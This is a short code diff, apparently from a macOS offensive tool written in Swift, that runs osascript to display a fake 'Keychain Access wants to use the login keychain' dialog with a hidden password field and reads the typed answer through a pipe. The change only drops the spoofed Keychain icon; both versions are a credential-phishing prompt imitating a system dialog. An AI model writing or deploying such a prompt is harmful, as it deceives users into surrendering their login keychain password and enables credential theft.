@@ -185,7 +185,7 @@ do {
             do {
                 let proc = Process()
                 proc.launchPath = "/usr/bin/osascript"
-                let args : [String] = ["-e", ##"set popup to display dialog "Keychain Access wants to use the login keychain" & return & return & "Please enter the keychain password" & return default answer "" with icon file "Applications:Utilities:Keychain Access.app:Contents:Resources:AppIcon.icns" with title "Authentication Needed" with hidden answer"##]
+                let args : [String] = ["-e", ##"set popup to display dialog "Keychain Access wants to use the login keychain" & return & return & "Please enter the keychain password" & return default answer "" with title "Authentication Needed" with hidden answer"##]
                 proc.arguments = args
                 let pipe = Pipe()
                 proc.standardOutput = pipe
